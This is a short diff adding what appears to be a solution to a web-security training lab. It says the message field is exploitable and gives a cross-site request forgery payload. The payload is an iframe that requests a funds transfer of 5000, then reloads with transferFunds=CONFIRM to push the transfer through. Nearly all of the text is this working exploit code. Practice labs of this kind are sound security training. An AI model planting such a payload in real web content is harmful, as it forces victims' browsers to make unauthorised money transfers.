@@ -1,0 +1,10 @@
+The message field is exploitable. The following is the exploit I crafted. 
+
+<iframe id="scrfFrame" src="attack?Screen=308&menu=900&transferFunds=5000" onload="callConfirmFunc()"></iframe>
+
+<script>
+function callConfirmFunc() {
+	document.getElementById('scrfFrame').src = "attack?Screen=308&menu=900&transferFunds=CONFIRM";
+	document.getElementById('scrfFrame').onload = "";
+}
+</script>
